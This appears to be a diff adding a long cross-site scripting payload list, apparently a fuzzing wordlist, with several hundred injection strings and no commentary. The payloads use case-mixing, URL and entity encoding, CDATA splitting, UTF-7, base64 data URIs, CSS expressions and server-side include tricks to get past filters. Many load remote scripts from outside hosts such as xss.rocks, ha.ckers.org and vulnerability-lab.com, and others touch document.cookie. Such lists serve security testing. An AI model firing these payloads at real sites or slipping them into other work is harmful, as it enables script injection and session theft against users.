+-1<XmL Id=i><X><c><![CdAtA[<iMg sRc=\"JaVaS]]<![CdAtA[CrIpT:DoCuMeNt.cOoKiE=TrUe;\">]]</c></x></xMl><SpAn dAtAsRc=#I DaTaFlD=C DaTaFoRmAtAs=hTmL></SpAn>
+confirm(2)>%2f
+<A HrEf=\"JaVaScRiPt:dOcUmEnT.LoCaTiOn='HtTp://wWw.vUlNeRaBiLiTy-lAb.cOm/'\">CrOsSsItEsCrIpTiNg</A>
+<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>
+<BODY ONLOAD=alert('XSS')>
+<img src = \"mocha:document.cookie = true ; \">
+<img dynid = xss src = \"javascript:alert('xss')\">
+< / script><script>alert(1)< / script>
+<br size=\"&{document.cookie=true}\">
+<img%20src='vbscript:msgbox(\"crosssitescripting\")'>
+<META HTTP-EQUIV=\"Set-Cookie\" Content=\"USERID=&lt;SCRIPT&gt;alert('XSS')&lt;/SCRIPT&gt;\">
+<layer src=\"javascript:document.cookie=true;\"></layer>
+<ScRiPt <B>=aLeRt('XsS');\"></ScRiPt>
+<html><noalert><noscript>(xss)</noscript><script>(xss)</script>
+>\"<StYlE><!--</StYlE><sCrIpT>DoCuMeNt.cOoKiE=TrUe;//--></ScRiPt>
+<html><noalert><noscript>(xss)<%2fnoscript><script>(xss)<%2fscript>
+-1<crosssitescripting style=\"crosssitescripting:expression(document.cookie=true)\">
+-1<DiV DaTaFlD=\"b\" DaTaFoRmAtAs=\"HtMl\" DaTaSrC=\"#X\"></dIv> ]]> [a][A]ScRiPt>dOcUmEnT.CoOkIe=tRuE;[a][A]/sCrIpT>
+-1<img dynsrc=\"javascript:document.cookie=true;\">
+</sTyLe><ScRiPt>aLeRt(1)</sCrIpT>
+<IMG SRC=\"jav&#x0A;ascript:alert('XSS');\">
+<img%20id=xss%20src=`javascript:alert(\"'xss'\")`>
+<xml id = i><x><c><![cdata[<img id = xss src = \"javas]]<![cdata[cript:alert('xss') ; \">]]< / c><x>< / xml>
+-1<iframe src=\"javascript:document.cookie=true;\"></iframe>
+<MeTa hTtP-EqUiV=\"sEt-cOoKiE\" cOnTeNt=\"UsErId=&Lt;sCrIpT&Gt;aLeRt('XsS')&Lt;/ScRiPt&gT;\">
+<img%20id=xss%20src=\"javascript:alert('xss');\">
+<BoDy oNlOaD!#$%&()*~+-_.,:;?@[/|\\\\]^`=AlErT(\"cRoSsSiTeScRiPtInG\")>
+<script>alert('xssya') ; < / script>
+<ImG Id=xSs sRc=`JaVaScRiPt:aLeRt(\"'xSs'\")`>
+<IMG SRC = \"jav & #x09 ; ascript:alert('XSS') ; \">
+<ImG SrC=\"lIvEsCrIpT:[cOdE]\">
+<style>%2ecrosssitescripting{background-image:url(\"javascript:document%2ecookie=true\");}<%2fstyle><a%20class=crosssitescripting><%2fa>
+<StYlE>.cRoSsSiTeScRiPtInG{BaCkGrOuNd-iMaGe:uRl(\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE\");}</sTyLe><A ClAsS=CrOsSsItEsCrIpTiNg></a>
+<style>body{-moz-binding:url(\"http: /  / vulnerability-lab.com / crosssitescriptingmoz.xml#crosssitescripting\")}< / style>
+<IMG%20SRC=javascript:alert(&quot;XSS&quot;)>
+<xml id = \"crosssitescripting\"><i><b><img src = \"javas<!-- -->cript:alert('crosssitescripting')\">< / b>< / i>< / xml>
+>\"<HeAd><MeTa hTtP-EqUiV=\"cOnTeNt-tYpE\" cOnTeNt=\"TeXt/hTmL; cHaRsEt=uTf-7\"> </hEaD>+aDw-sCrIpT+Ad4-DoCuMeNt.cOoKiE=TrUe;+AdW-/sCrIpT+Ad4-
+<style>@im\\\\port'\\\\ja asc ipt:document.cookie=true';</style>
+<input%20type=\"image\"%20dynsrc=\"javascript:document%2ecookie=true;\">
+<img src = \" javascript:document.cookie = true ; \">
+<IMG SRC=\"jav&#x0D;ascript:alert('XSS');\">
+<ScRiPt/xSs iD=XsS SrC=\"hTtP://Ha.cKeRs.oRg/xSs.jS\"></sCrIpT>
+<link rel=\"stylesheet\" href=\"http://vulnerability-lab.com/crosssitescripting.css\">
+>\"<img%20dynsrc=\"javascript:document%2ecookie=true;\">
+-1<style><!--</style><script>document.cookie=true;//--></script>
+<img lowsrc = \"javascript:document.cookie = true ; \">
+a = \"get\" ; 
+<IMG SRC = javascript:alert('XSS')>
+<STYLE>@import'http:%2f%2fxss%2erocks%2fxss%2ecss';<%2fSTYLE>
+<bgsound%20src=\"javascript:alert('crosssitescripting');\">
+<InPuT TyPe=\"ImAgE\" dYnSrC=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+<img id=xss src=\"&14;javascript:alert('xss');\">
+<!--[if gte ie 4]> <script>alert('crosssitescripting');</script> <![endif]-->
+>\"<object%20classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param%20name=url%20value=javascript:document%2ecookie=true><%2fobject>
+<XmL Id=i><X><c><![CdAtA[<iMg sRc=\"JaVaS]]<![CdAtA[CrIpT:DoCuMeNt.cOoKiE=TrUe;\">]]</c></x></xMl><SpAn dAtAsRc=#I DaTaFlD=C DaTaFoRmAtAs=hTmL></SpAn>
+-1<ScRiPt <B>DoCuMeNt.cOoKiE=TrUe;</sCrIpT>
+<div%20style=\"background-image:%20url(javascript:alert('xss'))\">
+-1<body background = \"javascript:document.cookie = true ; \">
+<META HTTP-EQUIV = \"refresh\" CONTENT = \"0 ; url = javascript:alert('XSS') ; \">
+<SCR%00IPT>alert(\\\"XSS\\\")< / SCR%00IPT>
+\"%20onmouseover=alert(xss)%20\">
+-1<style type = \"text / javascript\">document.cookie = true ; < / style>
+<Br sIzE=\"&{dOcUmEnT.CoOkIe=tRuE}\">
+\"data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==\"></object>
+<svg><script>alert(/1/)</script>
+<crosssitescripting style=\"crosssitescripting:expression(alert('crosssitescripting'))\"> exp/*<a style='no\\\\crosssitescripting:nocrosssitescripting(\"*//*\"); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(\"crosssitescripting\"))'>
+-1<A HrEf=\"JaVaScRiPt#dOcUmEnT.CoOkIe=tRuE;\">
+<LiNk rEl=\"StYlEsHeEt\" HrEf=\"JaVaScRiPt:aLeRt('CrOsSsItEsCrIpTiNg');\">
+>\"exp%2f*<a%20style='no\\\\crosssitescripting:nocrosssitescripting(\"*%2f%2f*\");crosssitescripting:ex%2f*crosssitescripting*%2f%2f*%2f*%2fpression(document%2ecookie=true)'>
+<script a = \">\" '' id = xss src = \"http: /  / ha.ckers.org / xss.js\">< / script>
+<ImG DyNiD=XsS SrC=\"jAvAsCrIpT:AlErT('xSs')\">
+-1<BoDy bAcKgRoUnD=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+<BR SIZE=\"&{alert('XSS')}\">
+-1<table><td%20background=\"javascript:document%2ecookie=true;\">
+<img src = \"livescript:[code]\">
+<LINK REL = \"stylesheet\" HREF = \"http: /  / xss.rocks / xss.css\">
+<script>document%2ewrite(\"xss\");<%2fscript>
+<bgsound src=\"javascript:alert('crosssitescripting');\">
+>\"<ScRiPt <B>DoCuMeNt.cOoKiE=TrUe;</sCrIpT>
+<bgsound id=xss src=\"javascript:alert('xss');\">
+<video id=xss poster=javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32))//
+<input%20type=\"image\"%20src=\"javascript:alert('crosssitescripting');\">
+<div datafld = \"b\" dataformatas = \"html\" datasrc = \"#x\">< / div> ]]> [a][a]script>document.cookie = true ; [a][a] / script>
+><sCrIpT>AlErT(\"vLaB\")</sCrIpT>
+-1<link%20rel=\"stylesheet\"%20href=\"javascript:document%2ecookie=true;\">
+>\"<a href = \"about:<script>document.cookie = true ; < / script>\">
+<a href=\"http://server.com/\">crosssitescripting</a>
+>\"<img src = \"jav ascript:document.cookie = true ; \">
+<xml id = \"xss\"><i><b><img id = xss src = \"javas<!-- -->cript:alert('xss')\">< / b>< / i>< / xml><span dataid = xss src = \"#xss\" datafld = \"b\" dataformatas = \"html\">< / span>
+<style>li {list-style-image: url(\"javascript:alert('xss')\") ; }< / style><ul><li>xss
+<STYLE>@import'http://xss.rocks/xss.css';</STYLE>
+location = ?javascript:alert(1)>click
+\"div1\"><input value=\"``onmouseover=alert(1)\"></div> <div id=\"div2\"></div>
+>\"<ImG SrC=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+$,_ = 1}}).$ = alert< / script>
+aLeRt(1)></TiTlE><tItLe tItLe=></TiTlE>
+-1<BoDy oNlOaD!#$%&()*~+-_.,:;?@[/|\\\\]^`=DoCuMeNt.cOoKiE=TrUe;>
+<div%20datafld=\"b\"%20dataformatas=\"html\"%20dataid=xss%20src=\"#xss\"><%2fdiv>
+javascript:alert(1)%2f%2f><%2fvideo>
+<img%20id=xss%20src=\"&14;javascript:alert('xss');\">
+</sCrIpT><sCrIpT>AlErT(1)</ScRiPt>
+>\"<StYlE>.cRoSsSiTeScRiPtInG{BaCkGrOuNd-iMaGe:uRl(\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE\");}</sTyLe><A ClAsS=CrOsSsItEsCrIpTiNg></a>
+<? EcHo('<sCr)';eChO('iPt>dOcUmEnT.CoOkIe=tRuE</sCrIpT>'); ?>
+<img style=\"crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)\">
+\"data:text%2fhtml;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==\"><%2fembed>
+'\"<%2fscript><script>alert('xssya')<%2fscript>
+<script>alert(document.cookie)</script>@gmail.com
+<LaYeR Id=xSs sRc=\"HtTp://hA.CkErS.OrG/ScRiPtLeT.HtMl\"></LaYeR>
+<IMG SRC = java%00script:alert(\\\"XSS\\\")>
+>\"<input%20type=\"image\"%20dynsrc=\"javascript:document%2ecookie=true;\">
+<ScRiPt a=\">\" '' Id=xSs sRc=\"HtTp://hA.CkErS.OrG/XsS.Js\"></ScRiPt>
+'';!--\"<xSs>=&{()}
+<IfRaMe iD=XsS SrC=\"jAvAsCrIpT:AlErT('xSs'); <
+<div style = \"background-image: url(javascript:alert('xss'))\">
+>\"<xml id = \"x\"><a><b><script>document.cookie = true ; < / script> ; < / b>< / a>< / xml>
+'';!--\"<xss>=&{()}
+<select id = xss onfocus = javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+<meta http-equiv = \"refresh\" content = \"0 ;  url = http: /  /  ; url = javascript:alert('xss') ; \">
+<style type = \"text / javascript\">document.cookie = true ; < / style>
+<script>alert('xssya')< / script>
+<span%20datasrc=\"#crosssitescripting\"%20datafld=\"b\"%20dataformatas=\"html\"><%2fspan>
+<img%20style=\"crosssitescripting:expr%2f*crosssitescripting*%2fession(document%2ecookie=true)\">
+-1<style type=\"text/javascript\">document.cookie=true;</style>
+<StYlE>@iMpOrT'HtTp://xSs.rOcKs/xSs.cSs';</StYlE>
+confirm(2)>
+data:text / html,<script>alert(0)< / script>
+<A HrEf=\"HtTp://1113982867/\">CrOsSsItEsCrIpTiNg</A>
+<ScRiPt>aLeRt(/XsS/.sOuRcE)</ScRiPt>
+mHtMl:hTtP://HtMl5sEc.oRg/tEsT.HtMl!xSs.hTmL></IfRaMe>
+<ObJeCt tYpE=\"tExT/X-ScRiPtLeT\" dAtA=\"hTtP://Ha.cKeRs.oRg/sCrIpTlEt.hTmL\"></oBjEcT>
+<IMG SRC=`javascript:alert(\"RSnake says, 'XSS'\")`>
+<TaBlE BaCkGrOuNd=\"JaVaScRiPt:aLeRt('XsS')\">
+<t:set attributename=\"innerhtml\" to=\"crosssitescripting<script defer>alert(\"crosssitescripting\")</script>\">
+a=\"get\";
+<StYlE>Li {LiSt-sTyLe-iMaGe: UrL(\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\");</StYlE><uL><lI>CrOsSsItEsCrIpTiNg
+\" ; alert('xss') ;  /  / 
+<iframe id=xss / \"onload=alert(/xss/)></iframe>
+<meta http-equiv = \"refresh\" content = \"0 ; url = javascript:document.cookie = true ; \">
+<link rel = \"stylesheet\" href = \"javascript:alert('crosssitescripting') ; \">
+>\"<InPuT TyPe=\"ImAgE\" sRc=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+<img%20src=\"blah\"onmouseover=\"document%2ecookie=true;\">
+<HtMl><BoDy>
+<!--#exec cmd=\"/bin/echo '<scr'\"--><!--#exec cmd=\"/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'\"-->
+<img%20id=xss%20src=javascript:alert(\"xss\")>\";'%20>
+<ScRiPt iD=XsS SrC=HtTp://hA.CkErS.OrG/XsS.Js?<B>
+<? EcHo('<sCr)';eChO('iPt>aLeRt(\"CrOsSsItEsCrIpTiNg\")</ScRiPt>'); ?>
+>\"<StYlE>Li {LiSt-sTyLe-iMaGe: UrL(\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\");</StYlE><uL><lI>CrOsSsItEsCrIpTiNg
+<script>document.cookie = true ;  /  / -->< / script>
+<img%20id=xss%20src=&{alert('xss');};>
+<xml%20id=xss%20src=\"xsstest%2exml\"%20id=i><%2fxml><span%20dataid=xss%20src=#i%20datafld=c%20dataformatas=html><%2fspan>
+<meta%20http-equiv=\"refresh\"%20content=\"0;url=javascript:alert('crosssitescripting');\">
+-1<table background = \"javascript:document.cookie = true ; \">
+<body%20onload!#$%&()*~+-_%2e,:;?@[%2f|\\\\]^`=alert(\"xss\")>
+<style>li {list-style-image: url(\"javascript:alert('crosssitescripting')\");}</style><ul><li>crosssitescripting
+>\"<style>%2ecrosssitescripting{background-image:url(\"javascript:document%2ecookie=true\");}<%2fstyle><a%20class=crosssitescripting><%2fa>
+<SCRIPT>document.write(\"<SCRI\") ; < / SCRIPT>PT SRC = \"xss.rocks / xss.js\">< / SCRIPT>
+<script>a=%2fcrosssitescripting%2f%20alert(a%2esource)<%2fscript>
+<ScRiPt>aLeRt(1)</sCrIpT>
+<a%20href=\"javascript:document%2elocation='http:%2f%2fwww%2evulnerability-lab%2ecom%2f'\">crosssitescripting<%2fa>
+<xml%20id=i><x><c><![cdata[<img%20id=xss%20src=\"javas]]<![cdata[cript:alert('xss');\">]]<%2fc><x><%2fxml>
+<input id = xss onfocus = javascript:eval(string['fromcharcode'](97,108,101,114,116,40,39,120,115,115,39,41,32)) autofocus>
+<div style=\"binding: url([link to code]);\">
+<a href = \"http: /  / server.com / \">crosssitescripting< / a>
+1<script >prompt(962477)</script>
+<img%20src=\"jav%20ascript:document%2ecookie=true;\">
+<img \"\"\"><script>alert(\"crosssitescripting\")< / script>\">
+<img src = javascript:alert(\"crosssitescripting\")>
+<object%20classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param%20name=url%20value=javascript:alert('crosssitescripting')><%2fobject>
+<ImG%0aSrC%0a=%0a\"%0aJ%0aA%0aV%0aA%0aS%0aC%0aR%0aI%0aP%0aT%0a:%0aA%0aL%0aE%0aR%0aT%0a(%0a'%0aX%0aS%0aS%0a'%0a)%0a\"%0a>
+<script>alert(document.cookie)</script>
+<body%20onload=alert('crosssitescripting')>
+scriptalert(crosssitescripting)%2fscript
+\"><iframe src=a onload=alert(\"vl\") <
+<style>@import'http://vulnerability-lab.com/crosssitescripting.css';</style>
+<script src = http: /  / vulnerability-lab.com / crosssitescripting.js>< / script>
+<script>a=/xss/nalert('xss');</script>
+<META%20HTTP-EQUIV=\"Link\"%20Content=\"<http:%2f%2fxss%2erocks%2fxss%2ecss>;%20REL=stylesheet\">
+<DiV Id=xSs sTyLe=\"BiNdInG: uRl(jAvAsCrIpT:AlErT('xSs'));\">
+<ImG SrC=\"jAvAsCrIpT:AlErT('cRoSsSiTeScRiPtInG');\">
+-1<style>.crosssitescripting{background-image:url(\"javascript:document.cookie=true\");}</style><a class=crosssitescripting></a>
+<!--#exec%20cmd=\"%2fbin%2fecho%20'<scr'\"--><!--#exec%20cmd=\"%2fbin%2fecho%20'ipt%20src=http:%2f%2fvulnerability-lab%2ecom%2fcrosssitescripting%2ejs><%2fscript>'\"-->
+mhtml:http://html5sec.org/test.html!xss.html></iframe>
+-1<html><body><?xml:namespace prefix=\"t\" ns=\"urn:schemas-microsoft-com:time\"><?import namespace=\"t\" implementation=\"#default#time2\"><t:set attributename=\"innerhtml\" to=\"crosssitescripting<script defer>document.cookie=true</script>\"></body></html>
+<!--#exec%20cmd=\"%2fbin%2fecho%20'<script%20src'\"--><!--#exec%20cmd=\"%2fbin%2fecho%20'=http:%2f%2fha%2eckers%2eorg%2fxss%2ejs><%2fscript>'\"-->
+<img%20id=xss%20src=\"%20javascript:alert('xss');\">
++49 / >\"<iframe src = http: /  / vulnerability-lab.com>1337
+<div id = xss style = \"width: expression(alert('xss')) ; \">
+<SCRIPT SRC=http://xss.rocks/xss.js?<B>
+>\"<div style=\"background-image: url(javascript:document.cookie=true;)\">
+<IMG SRC = javascript:alert(String.fromCharCode(88,83,83))>
+<IMG LOWSRC=\"javascript:alert('XSS')\">
+-1scriptdocument%2ecookie=true;%2fscript
+<img id=xss src=\"blah>\"onmouseover=\"alert('xss');\">
+<script>referenceerror%2eprototype%2e__definegetter__('name',%20function(){alert(1)}),x<%2fscript>
+<XSS STYLE = \"xss:expression(alert('XSS'))\">
+<base href=\"javascript:alert('xss');//\">
+<iframe src=\"javascript:document.cookie=true;\"></iframe>
+<ScRiPt/xSs sRc=\"HtTp://xSs.rOcKs/xSs.jS\"></sCrIpT>
+<link%20rel=\"stylesheet\"%20href=\"http:%2f%2fha%2eckers%2eorg%2fxss%2ecss\">
+\"test\"></form><button form=\"test\" formaction=\"javascript:alert(1)\">x</button>
+\"-o-lInK:'jAvAsCrIpT:AlErT(1)';-o-lInK-SoUrCe:cUrReNt\">X</a>
+>\"<style>.crosssitescripting{background-image:url(\"javascript:document.cookie = true\") ; }< / style><a class = crosssitescripting>< / a>
+pRoMpT(1);>
+<meta http-equiv = \"link\" content = \"<http: /  / vulnerability-lab.com / crosssitescripting.css> ;  rel = stylesheet\">
+<InPuT TyPe=\"ImAgE\" dYnId=xSs sRc=\"JaVaScRiPt:aLeRt('XsS');\">
+;!--\"<xSs>=&{()}\"
+<script a=`>` src=\"http://vulnerability-lab.com/crosssitescripting.js\"></script>
+<ScRiPt sRc=hTtP://VuLnErAbIlItY-LaB.CoM/CrOsSsItEsCrIpTiNg.jS?<b>
+<ScRiPt>aLeRt(\"CrOsSsItEsCrIpTiNg2\")</sCrIpT>
+>\"<body%20onload!#$%&()*~+-_%2e,:;?@[%2f|\\\\]^`=document%2ecookie=true;>
+-1<input type=\"image\" src=\"javascript:document.cookie=true;\">
+<? echo('<scr)';echo('ipt>alert(\"crosssitescripting\")</script>'); ?>
+a=\"get\";b=\"url(\"\";c=\"javascript:\";d=\"alert('xss');\")\";eval(a+b+c+d);
+<StYlE TyPe=\"TeXt/cSs\">BoDy{bAcKgRoUnD:UrL(\"jAvAsCrIpT:AlErT('cRoSsSiTeScRiPtInG')\")}</StYlE>
+>\"&{dOcUmEnT.CoOkIe=tRuE;};
+eXp/*<a sTyLe='No\\\\CrOsSsItEsCrIpTiNg:nOcRoSsSiTeScRiPtInG(\"*//*\");CrOsSsItEsCrIpTiNg:eX/*cRoSsSiTeScRiPtInG*//*/*/PrEsSiOn(dOcUmEnT.CoOkIe=tRuE)'>
+<script%20a=`>`%20src=\"http:%2f%2fvulnerability-lab%2ecom%2fcrosssitescripting%2ejs\"><%2fscript>
+<img dynsrc = \"javascript:alert('crosssitescripting')\">
+<XmL SrC=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+<<script>alert(\"crosssitescripting\") ;  /  / << / script>
+<body%20onload!#$%&()*~+-_%2e,:;?@[%2f|\\\\]^`=document%2ecookie=true;>
+-1<img src = \"livescript:document.cookie = true ; \">
+< / title><script>alert(\"xss\") ; < / script>
+<ScRiPt a=\">\" '' SrC=\"hTtP://XsS.RoCkS/XsS.Js\"></ScRiPt>
+<DiV StYlE=\"wIdTh: ExPrEsSiOn(aLeRt('CrOsSsItEsCrIpTiNg'));\">
+<!--<VaLuE><![cDaTa[<XmL Id=i><X><c><![CdAtA[<iMg iD=XsS SrC=\"jAvAs<![cDaTa[cRiPt:aLeRt('XsS');\">
+<img id = xss src = 'javascript:alert('xss')
+<!--%20--%20--><script>document%2ecookie=true;<%2fscript><!--%20--%20-->
+>\"<layer src=\"javascript:document.cookie=true;\"></layer>
+<META HTTP-EQUIV=\"refresh\" CONTENT=\"0;url=data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K\">
+<div datafld=\"b\" dataformatas=\"html\" datasrc=\"#x\"></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>
+![cDaTa[<!--]]<ScRiPt>aLeRt('XsS');//--></sCrIpT>
+alt=alert(1)%2f%2f\">
+<style><!--<%2fstyle><script>document%2ecookie=true;%2f%2f--><%2fscript>
+<img lowsrc=\"javascript:document.cookie=true;\">
+>\"<img src = \"javascript:document.cookie = true ; \">
+<BoDy oNlOaD!#$%&()*~+-_.,:;?@[/|\\\\]^`=DoCuMeNt.cOoKiE=TrUe;>
+\"X\"><ImG OnErRoR=\"aLeRt(1)\"></pIcTuRe>
+\"div1\"><input%20value=\"``onmouseover=alert(1)\"><%2fdiv>%20<div%20id=\"div2\"><%2fdiv>
+<ScRiPt>rEfErEnCeErRoR.PrOtOtYpE.__DeFiNeGeTtEr__('NaMe', fUnCtIoN(){AlErT(1)}),x</ScRiPt>
+<img \"\"\"><script>alert(\"xss\")</script>\">
+\",,,,,x\" onerror = \"alert(1)\">
+<ScRiPt>dOcUmEnT.CoOkIe=tRuE;//--></sCrIpT>
+<TaBlE><tD BaCkGrOuNd=\"JaVaScRiPt:dOcUmEnT.CoOkIe=tRuE;\">
+<script src = http: /  / vulnerability-lab.com / crosssitescripting.js?<b>
+-1&<sCrIpT>DoCuMeNt.cOoKiE=TrUe;</sCrIpT>
+<xml%20id=\"crosssitescripting\"><i><b><img%20src=\"javas<!--%20-->cript:document%2ecookie=true\"><%2fb><%2fi><%2fxml><span%20datasrc=\"#crosssitescripting\"%20datafld=\"b\"%20dataformatas=\"html\"><%2fspan>
+%2f%2f1<script>prompt(919397)<%2fscript>
+< / textarea>'\"><script>alert(xss)< / script>
+>\"<img%20src=\"%20javascript:document%2ecookie=true;\">
+\"%20onblur=alert(xss)%20\">%20<\"
+<%2fscript><%2fscript><<<<script><>>>><<<script>alert(xss)<%2fscript>
+-1<style%20type=\"text%2fcss\">body{background:url(\"javascript:document%2ecookie=true\")}<%2fstyle>
+>\"<crosssitescripting style = \"crosssitescripting:expression(document.cookie = true)\">
+<IfRaMe iD=XsS///////OnLoAd=aLeRt(/XsS/)></IfRaMe>
+<IfRaMe/sRc=\"DaTa:tExT/HtMl; BaSe64 ,PgJvZhKgB25sB2FkPwFsZxJ0KdEpPg==\">
+<DIV%20STYLE=\"width:%20expression(alert('XSS'));\">
+&<script>document%2ecookie=true;<%2fscript>
+<HtMl><BoDy><?xMl:nAmEsPaCe pReFiX=\"t\" Ns=\"UrN:ScHeMaS-MiCrOsOfT-CoM:TiMe\"><?ImPoRt nAmEsPaCe=\"T\" iMpLeMeNtAtIoN=\"#DeFaUlT#TiMe2\"><T:SeT AtTrIbUtEnAmE=\"iNnErHtMl\" To=\"XsS<ScRiPt dEfEr>aLeRt(\"XsS\")</sCrIpT>\"></BoDy></hTmL>
+>\"<img src = \"blah\"onmouseover = \"document.cookie = true ; \">
+>\"<div style = \"width: expression(document.cookie = true ; ) ; \">
+<script>document.write(\"<scri\");</script>pt src=\"http://vulnerability-lab.com/crosssitescripting.js\"></script>
+\" ; alert('xss) /  / 
+<script>document.cookie=true;</script>
+<!--#exec%20cmd=\"%2fbin%2fecho%20'<SCRIPT%20SRC'\"--><!--#exec%20cmd=\"%2fbin%2fecho%20'=http:%2f%2fxss%2erocks%2fxss%2ejs><%2fSCRIPT>'\"-->
+\"x:alert\" onerror = \"eval(src+'(0)')\">
+<script%20a=\">\"%20src=\"http:%2f%2fvulnerability-lab%2ecom%2fcrosssitescripting%2ejs\"><%2fscript>
+<IMG SRC=\" &#14; javascript:alert('XSS');\">
+>\"<base%20href=\"javascript:document%2ecookie=true;%2f%2f\">
+\",,,,,x\" OnErRoR=\"aLeRt(1)\">
+<<script>document.cookie=true;</script>
+<StYlE TyPe=\"TeXt/cSs\">BoDy{bAcKgRoUnD:UrL(\"jAvAsCrIpT:AlErT('xSs')\")}</sTyLe>
+<ViDeO+SrC=X+OnErRoR=PrOmPt(1);>
+>\"<style>.crosssitescripting{background-image:url(\"javascript:document.cookie=true\");}</style><a class=crosssitescripting></a>
+-1<xml id = \"crosssitescripting\"><i><b><img src = \"javas<!-- -->cript:document.cookie = true\">< / b>< / i>< / xml><span datasrc = \"#crosssitescripting\" datafld = \"b\" dataformatas = \"html\">< / span>
+<img%20src=\"mocha:[code]\">
+<img lowid = xss src = \"javascript:alert('xss')\">
+<script id = xss src = http: /  / ha.ckers.org / xss.js>< / script>
+<script>document.cookie = true ; < / script>
+<img style=\"xss:expr/*xss*/ession(alert('xss'))\">
+<LINK REL=\"stylesheet\" HREF=\"javascript:alert('XSS');\">
+-1<xml%20id=i><x><c><![cdata[<img%20src=\"javas]]<![cdata[cript:document%2ecookie=true;\">]]<%2fc><%2fx><%2fxml><span%20datasrc=#i%20datafld=c%20dataformatas=html><%2fspan>
+>\"<style>@im\\\\port'\\\\ja asc ipt:document.cookie=true';</style>
+<ObJeCt cLaSsId=\"ClSiD:...\" cOdEbAsE=\"jAvAsCrIpT:DoCuMeNt.cOoKiE=TrUe;\">
+<%2fscript><script>alert(1)<%2fscript>
+<iframe/src=\"data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg==\">
+<!--#exec cmd = \" / bin / echo '<SCRIPT SRC'\"--><!--#exec cmd = \" / bin / echo ' = http: /  / xss.rocks / xss.js>< / SCRIPT>'\"-->
+a=\"get\";b=\"url\";c=\"javascript:\";d=\"alert('xss');\";eval(a+b+c+d);
+<object type=\"text/x-scriptlet\" data=\"http://ha.ckers.org/scriptlet.html\"></object>
+<script>alert('xssya');<%2fscript>
+<iframe src = \"javascript:document.cookie = true ; \">< / iframe>
+<style>@im\\\\port'\\\\ja asc ipt:alert(\"xss\")' ; < / style>
+<div style=\"background-image: url(javascript:document.cookie=true;);\">
+1<script>prompt(999691)< / script>
+-1<img%20src=\"blah>\"%20onmouseover=\"document%2ecookie=true;\">
+>\" & {document.cookie = true ; } ; 
+-1<input%20type=\"image\"%20src=\"javascript:document%2ecookie=true;\">
+<script%20src=http:%2f%2fvulnerability-lab%2ecom%2fcrosssitescripting%2ejs><%2fscript>
+<script%20src=%2f%2fvulnerability-lab%2ecom%2f%2ejs>
+<img%20\"\"\"><script>alert(\"crosssitescripting\")<%2fscript>\">
+<script>alert(%2fxss%2f%2esource)<%2fscript>
+<iframe id=xss src=\"javascript:alert('xss'); <
+<STYLE TYPE=\"text/javascript\">alert('XSS');</STYLE>
+<SCRIPT SRC = \"http: /  / xss.rocks / xss.jpg\">< / SCRIPT>
+>\"<style%20type=\"text%2fcss\">body{background:url(\"javascript:document%2ecookie=true\")}<%2fstyle>
+cOnFiRm(2)>
+<DiV OnMoUsEoVeR=\"dOcUmEnT.CoOkIe=tRuE;\">
+>\"<table><td%20background=\"javascript:document%2ecookie=true;\">
+<IsInDeX AcTiOn=j a vAs c r iPt:aLeRt(1) TyPe=iMaGe>
+-1<script>a =  / crosssitescripting /  document.cookie = true ; < / script>
+<style>@im\\\\port'\\\\ja asc ipt:alert(\"crosssitescripting\")' ; < / style>
+-1<crosssitescripting%20style=\"crosssitescripting:expression(document%2ecookie=true)\">
+<StYlE>@iM\\\\pOrT'\\\\Ja aSc iPt:aLeRt(\"CrOsSsItEsCrIpTiNg\")';</StYlE>
+>\"<img style = \"crosssitescripting:expr / *crosssitescripting* / ession(document.cookie = true)\">
+>\"<xml%20id=\"x\"><a><b><script>document%2ecookie=true;<%2fscript>;<%2fb><%2fa><%2fxml>
+<body%20background=javascript:'\"><script>alert(xss)<%2fscript>><%2fbody>
+>\"<div%20datafld=\"b\"%20dataformatas=\"html\"%20datasrc=\"#x\"><%2fdiv>%20]]>%20[a][a]script>document%2ecookie=true;[a][a]%2fscript>
+<bgsound%20id=xss%20src=\"javascript:alert('xss');\">
+<input type = \"image\" dynsrc = \"javascript:document.cookie = true ; \">
+<MeTa hTtP-EqUiV=\"rEfReSh\" CoNtEnT=\"0; UrL=HtTp://;UrL=JaVaScRiPt:aLeRt('CrOsSsItEsCrIpTiNg');\">
+SRC =  & #10<IMG 6 ;  & #97 ;  & #118 ;  & #97 ;  & #115 ;  & #99 ;  & #114 ;  & #105 ;  & #112 ;  & #116 ;  & #58 ;  & #97 ;  & #108 ;  & #101 ;  & #114 ;  & #116 ;  & #40 ;  & #39 ;  & #88 ;  & #83 ;  & #83 ;  & #39 ;  & #41 ; >
+<ImG SrC=JaVaScRiPt:aLeRt(&QuOt;xSs&qUoT;)>
+\"javascript:alert(1)\"><%2ftable>
+>\"<div style = \"behaviour: url([link to code]) ; \">
+\"data:text%2fhtml;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4=\">
+>\"<script>alert(document%2ecookie)<%2fscript><div%20style=\"1@gmail%2ecom
+<IMG SRC=javascript:alert(&quot;XSS&quot;)>
+>\"<crosssitescripting style=\"crosssitescripting:expression(document.cookie=true)\">
+>\"<style%20type=\"text%2fjavascript\">document%2ecookie=true;<%2fstyle>
